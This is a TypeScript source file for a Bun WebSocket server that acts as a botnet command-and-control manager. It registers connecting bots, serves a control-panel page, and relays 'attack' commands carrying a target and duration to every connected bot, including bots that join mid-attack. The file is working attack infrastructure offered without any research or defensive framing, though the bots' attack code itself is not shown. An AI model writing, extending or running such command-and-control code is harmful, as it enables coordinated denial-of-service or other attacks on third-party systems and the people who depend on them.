import { serve } from "bun";

const bots = new Map();
const clients = new Set();
let currentAttack: any = null;

const server = serve({
  port: 3000,
  fetch(req, server) {
    const url = new URL(req.url);
    const type = url.searchParams.get("type") || "bot";
    
    // Serve the dashboard directly if accessed via browser
    if (type === "control" && req.headers.get("upgrade") !== "websocket") {
       return new Response(Bun.file("../control-panel/index.html"), {
         headers: { "Content-Type": "text/html" }
       });
    }

    if (server.upgrade(req, { data: { type } })) {
      return;
    }
    return new Response("Bot Manager API");
  },
  websocket: {
    open(ws) {
      const type = (ws.data as any)?.type || "bot";
      if (type === "control") {
        clients.add(ws);
        console.log("Control Panel connected");
        broadcastStats();
        
        if (currentAttack) {
          (ws as any).send(JSON.stringify({ type: "active_attack", ...currentAttack }));
        }
      } else {
        const botId = Math.random().toString(36).substring(7);
        const botData = { id: botId, type: "bot", status: "active", os: "Unknown" };
        ws.data = botData;
        bots.set(botId, { ws, ...botData });
        console.log(`Bot connected: ${botId}`);
        
        broadcastToControls({ type: "bot_info", ...botData });
        broadcastStats();
        
        if (currentAttack && currentAttack.endTime > Date.now()) {
          const remaining = Math.floor((currentAttack.endTime - Date.now()) / 1000);
          if (remaining > 0) {
            (ws as any).send(JSON.stringify({ type: "attack", ...currentAttack.params, duration: remaining }));
          }
        }
      }
    },
    message(ws, message) {
      try {
        const data = JSON.parse(message.toString());
        
        if (ws.data.type === "control") {
          if (data.command === "attack") {
            const params = data.params;
            currentAttack = {
              params,
              startTime: Date.now(),
              endTime: Date.now() + (params.duration * 1000)
            };
            
            console.log(`Broadcasting attack command to ${bots.size} bots:`, params);
            for (const [id, bot] of bots) {
              (bot.ws as any).send(JSON.stringify({ type: "attack", ...params }));
            }
            
            // Log to other control panels
            broadcastToControls({ type: "log", message: `Global attack initiated: ${params.target}`, level: "command" });
          }
        }
      } catch (e) {
        console.error("Invalid WS message", e);
      }
    },
    close(ws) {
      if (ws.data.type === "control") {
        clients.delete(ws);
      } else {
        bots.delete(ws.data.id);
        broadcastStats();
      }
    },
  },
});

function broadcastToControls(data: any) {
  const payload = JSON.stringify(data);
  for (const client of clients) {
    (client as any).send(payload);
  }
}

function broadcastStats() {
  const stats = {
    total: bots.size,
    active: Array.from(bots.values()).filter(b => b.status === "active").length,
  };
  broadcastToControls({ type: "stats", ...stats });
}

console.log(`Manager listening on ${server.hostname}:${server.port}`);
